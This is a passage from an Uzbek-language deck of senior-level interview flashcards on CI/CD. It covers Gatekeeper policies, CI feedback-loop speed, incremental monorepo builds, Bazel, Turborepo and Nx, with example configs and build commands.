K8sRequiredLabels<br>metadata: { name: ns-owner }<br>spec:<br>  enforcementAction: dryrun<br>  match: { kinds: [{ apiGroups: [&quot;&quot;], kinds: [Namespace] }] }<br>  parameters: { labels: [owner] }</pre><pre>kubectl get constrainttemplates<br>kubectl get k8srequiredlabels ns-owner -o yaml   # status.violations (audit)</pre><p><b>Tuzoqlar:</b></p><ul><li>Rego xatosi — template <code>status</code>da ko'rinadi, policy esa jim ishlamaydi. <code>gator test</code> bilan unit test yoz.</li><li><code>enforcementAction: deny</code> darhol — mavjud deploy'lar sinadi; <code>dryrun</code>/<code>warn</code> bilan boshla.</li><li>Boshqa resurslarga qarash (<code>data.inventory</code>) uchun sync konfiguratsiyasi kerak — aks holda bo'sh.</li></ul><p><b>Senior nuqta:</b> Gatekeeper vs Kyverno: Gatekeeper — Rego, kuchli va umumiy (OPA'ni boshqa joyda ham ishlatasiz); Kyverno — YAML/CEL, o'rganish oson, mutate/generate/image verify ichida. Kubernetes'ning o'zida <code>ValidatingAdmissionPolicy</code> (CEL, GA 1.30) oddiy qoidalar uchun tashqi webhook'siz yechim.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40714	<p>CI feedback loop nima?</p>	<p><b>Qisqa javob:</b> CI feedback loop — developer push qilgandan to CI natijasini (yashil/qizil) olguncha ketgan vaqt. Maqsad odatda: PR check'lari <b>10 daqiqadan kam</b> (ideal 5), lokal testlar soniyalar. Sekin feedback — kontekst almashish, katta PR'lar va &quot;CI'ni kutib o'tirmayman&quot; madaniyati.</p><p><b>Muammo:</b> 40 daqiqalik pipeline: developer boshqa vazifaga o'tadi, natija kelganda kontekst yo'qolgan; xato bo'lsa yana 40 daqiqa. Kuniga 3-4 iteratsiya — mahsuldorlik keskin tushadi.</p><p><b>Qanday ishlaydi (qayerda vaqt ketadi):</b></p><pre>queue (runner kutish) -&gt; checkout -&gt; dependency install -&gt; build -&gt; test -&gt; scan -&gt; report<br>   ^ runner yetishmasligi   ^ cache yo'q    ^ incremental yo'q  ^ ketma-ket, sekin testlar</pre><p><b>Amalda (tezlashtirish):</b></p><pre>jobs:<br>  test:<br>    strategy: { matrix: { shard: [1, 2, 3, 4] } }   # testlarni bo'lish<br>    steps:<br>      - uses: actions/checkout@v4<br>      - uses: actions/setup-go@v5<br>        with: { go-version-file: go.mod, cache: true }   # dependency/build cache<br>      - run: go test ./... -run &quot;$(./scripts/shard.sh ${{ matrix.shard }} 4)&quot;<br>  lint:            # test bilan parallel<br>    runs-on: ubuntu-latest<br>    steps: [ { uses: actions/checkout@v4 }, { run: make lint } ]</pre><p>O'lchash: GitHub Actions usage/insights, <code>gh run list --json durationMs</code> yoki DORA/CI dashboard; p50 va p90'ni kuzat.</p><p><b>Tuzoqlar:</b></p><ul><li>Faqat o'rtachani ko'rish — p90 (eng sekin run'lar) developer tajribasini belgilaydi.</li><li>Hamma narsani PR'da qilish (to'liq e2e, DAST) — sekin qismlarni main/nightly'ga ko'chir.</li><li>Flaky testlar — retry vaqtni ikki baravar oshiradi.</li></ul><p><b>Senior nuqta:</b> Feedback loop qatlamli: IDE/pre-commit (soniya) -&gt; PR CI (daqiqa) -&gt; main/nightly (soat). Har tekshiruvni xatoni eng arzon ushlaydigan eng tez qatlamga joylashtir. CI vaqti — platforma jamoaning SLO'si bo'lishi kerak.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40715	<p>Monorepo incremental building nima?</p>	<p><b>Qisqa javob:</b> Monorepo incremental build — faqat o'zgargan fayllar va ularga <b>bog'liq</b> (dependency graph bo'yicha downstream) target'larni build/test qilish; qolganlari uchun avvalgi natija cache'dan olinadi. Asos: kirish (source, dependency, tool versiyasi) hash'i bir xil bo'lsa — natija ham bir xil.</p><p><b>Muammo:</b> 200 paketli monorepo'da har PR'da hammasini build/test qilish — soatlar. Bitta README o'zgarishi uchun to'liq pipeline isrof.</p><p><b>Qanday ishlaydi:</b></p><pre>o'zgargan: libs/auth<br>graph:  libs/auth &lt;- services/api &lt;- apps/web<br>        libs/billing (o'zgarmagan)<br>affected = {libs/auth, services/api, apps/web}<br>har target: key = hash(inputs) -&gt; cache hit? natijani olish : bajarish va cache'ga yozish</pre><p><b>Amalda:</b></p><pre># Nx<br>npx nx affected -t test --base=origin/main --head=HEAD<br># Turborepo<br>npx turbo run build test --filter='...[origin/main]'<br># Bazel<br>bazel test //... --remote_cache=grpcs://cache.org.com   # cache hit'lar &quot;cached&quot; deb chiqadi<br># Go (oddiy holat) - Go build cache o'zi incremental<br>go test ./...    # o'zgarmagan paketlar: &quot;ok ... (cached)&quot;</pre><p>CI'da <code>fetch-depth: 0</code> kerak — base bilan solishtirish uchun tarix.</p><p><b>Tuzoqlar:</b></p><ul><li>Graph to'liq emas (yashirin dependency: umumiy config fayl, env var, codegen) — kerakli test ishlamaydi, xato main'ga tushadi. Input'larni aniq e'lon qil.</li><li>Nondeterministik build (timestamp, random) — hash har safar boshqa, cache hech qachon ishlamaydi.</li><li>Shared remote cache'ga har kim yozsa — cache poisoning; yozishni faqat ishonchli CI'ga ber.</li></ul><p><b>Senior nuqta:</b> Incremental build'ning ishonchliligi hermeticity'ga bog'liq. Nightly'da to'liq (cache'siz) build ishlatib, affected logikasi biror narsani o'tkazib yuborayotganini tekshirib tur.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40716	<p>Bazel nima?</p>	<p><b>Qisqa javob:</b> Bazel — Google'ning (Blaze'dan) ochiq kodli build tizimi: ko'p tilli (Java, Go, C++, Python, JS ...), <b>hermetic</b> (build faqat e'lon qilingan input'larga bog'liq), <b>reproducible</b>, aniq dependency graph, remote caching va remote execution bilan katta monorepo'larni tez build qiladi. Build fayllari Starlark tilida (<code>BUILD.bazel</code>, <code>MODULE.bazel</code>).</p><p><b>Muammo:</b> Minglab developer va millionlab qatorli monorepo'da <code>make</code>/til-maxsus tool'lar: build sekin, natija mashinaga bog'liq (&quot;menda ishlaydi&quot;), keraksiz qayta build.</p><p><b>Qanday ishlaydi:</b></p><pre>BUILD fayllar -&gt; action graph (har action: input hash -&gt; output)<br>   action key cache'da? (local / remote cache) -&gt; natijani yuklab olish<br>   yo'q -&gt; bajarish (lokal sandbox yoki remote execution klaster) -&gt; cache'ga yozish<br>sandbox: action faqat e'lon qilingan fayllarni ko'radi -&gt; yashirin dependency xato beradi</pre><p><b>Amalda:</b></p><pre># BUILD.bazel<br>load(&quot;@rules_go//go:def.bzl&quot;, &quot;go_binary&quot;, &quot;go_library&quot;, &quot;go_test&quot;)<br>go_library(name = &quot;auth&quot;, srcs = [&quot;auth.go&quot;], importpath = &quot;org/libs/auth&quot;, deps = [&quot;//libs/crypto&quot;])<br>go_test(name = &quot;auth_test&quot;, srcs = [&quot;auth_test.go&quot;], embed = [&quot;:auth&quot;])</pre><pre>bazel build //services/api:api<br>bazel test //... --remote_cache=grpcs://cache.org.com<br>bazel query 'rdeps(//..., //libs/auth)'      # auth'ga kim bog'liq<br>bazel run //:gazelle                         # Go BUILD fayllarini avtomatik yaratish</pre><p><code>WORKSPACE</code> eskirgan — Bzlmod (<code>MODULE.bazel</code>) Bazel 7+ da default, 8 da WORKSPACE o'chirilgan.</p><p><b>Tuzoqlar:</b></p><ul><li>O'rganish va migratsiya narxi katta: har dependency'ni BUILD fayllarda e'lon qilish, ekotizim tool'lari bilan ziddiyat (go modules, npm).</li><li>Kichik/o'rta loyihaga Bazel — ortiqcha murakkablik.</li><li>Remote cache'siz Bazel'ning asosiy afzalligi yo'qoladi.</li></ul><p><b>Senior nuqta:</b> Bazel'ni tanlash — texnik emas, tashkiliy qaror: unga alohida build/platform jamoasi kerak. Yuzlab servis va ko'p tilli monorepo'da o'zini oqlaydi; aks holda til-native tool'lar + Nx/Turborepo yetarli.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40717	<p>Turborepo nima?</p>	<p><b>Qisqa javob:</b> Turborepo (Vercel) — JS/TS monorepo'lar uchun task runner: <code>package.json</code> workspace'laridan dependency graph quradi, task'larni (build, test, lint) to'g'ri tartibda va parallel bajaradi, natijalarni input hash bo'yicha lokal va <b>remote cache</b>'da saqlaydi. Rust'da yozilgan, sozlash minimal (<code>turbo.json</code>).</p><p><b>Muammo:</b> npm/pnpm workspace'lar bilan 30 paketli monorepo'da <code>pnpm -r build</code> hammasini ketma-ket qayta build qiladi; CI har safar noldan.</p><p><b>Qanday ishlaydi:</b></p><pre>turbo run build<br>  graph: ui -&gt; web, ui -&gt; admin (&quot;^build&quot; = avval dependency'larning build'i)<br>  har task: hash(fayllar + env + dependency hash'lari) -&gt; cache hit? log va outputs'ni tiklash<br>                                                       -&gt; miss: bajarish, outputs'ni saqlash</pre><p><b>Amalda:</b></p><pre>{<br>  &quot;$schema&quot;: &quot;https://turbo.build/schema.json&quot;,<br>  &quot;tasks&quot;: {<br>    &quot;build&quot;: { &quot;dependsOn&quot;: [&quot;^build&quot;], &quot;outputs&quot;: [&quot;dist/**&quot;, &quot;.next/**&quot;, &quot;!.next/cache/**&quot;] },<br>    &quot;test&quot;:  { &quot;dependsOn&quot;: [&quot;build&quot;], &quot;outputs&quot;: [] },<br>    &quot;lint&quot;:  {}<br>  },<br>  &quot;globalEnv&quot;: [&quot;NODE_ENV&quot;]<br>}</pre><pre>npx turbo run build test<br># &gt;&gt;&gt; FULL TURBO (hammasi cache'dan)<br>npx turbo run test --filter=web...            # web va uning dependency'lari<br>npx turbo run build --filter='...[origin/main]'   # o'zgarganlar va ularga bog'liqlar<br>npx turbo login &amp;&amp; npx turbo link             # Vercel remote cache (yoki self-hosted)</pre><p><b>Tuzoqlar:</b></p><ul><li><code>outputs</code> noto'g'ri yozilsa — cache hit bo'ladi, lekin <code>dist/</code> tiklanmaydi va keyingi task yiqiladi.</li><li>Build'ga ta'sir qiluvchi env var'ni <code>env</code>/<code>globalEnv</code>ga qo'shmaslik — boshqa muhit uchun eski natija qaytadi (eng xavfli xato).</li><li>Turborepo — task runner, bundler emas; Nx'dan farqli ravishda kod generatsiya va plugin ekotizimi kam.</li></ul><p><b>Senior nuqta:</b> Turborepo — &quot;eng kam sozlash bilan tez foyda&quot;: mavjud workspace'ga qo'shib darhol cache olasan. Juda katta va ko'p tilli repo'da Nx yoki Bazel'ning kuchli graph va distributed execution imkoniyatlari kerak bo'lishi mumkin.</p>	lvl::Senior dom::cicd sec::h13 GitOps_supply_chain
Interview Drill::CI/CD::H13 GitOps & supply chain	idrill-40718	<p>Nx nima?</p>	<p><b>Qisqa javob:</b> Nx (Nrwl) — monorepo build tizimi va framework: loyiha/dependency graph (kod importlarini tahlil qilib avtomatik), <code>affected</code> buyruqlari, lokal va remote cache (Nx Cloud yoki self-hosted), <b>distributed task execution</b> (task'larni bir nechta CI agent'ga taqsimlash), kod generatorlari va plugin'lar (React, Angular, Node, Go, Gradle ...).</p><p><b>Muammo:</b> Katta monorepo'da faqat &quot;tez build&quot; projects + deps (import tahlili, package.json, plugin'lar)<br>nx affected -t test --base=main<br>   -&gt; affected projects -&gt; task graph -&gt; cache (lokal/remote)<br>   -&gt; Nx Agents: task'lar N ta CI mashinaga bo'linadi<br>module boundaries: tag'lar bo'yicha lint qoidasi (scope:billing -&gt;
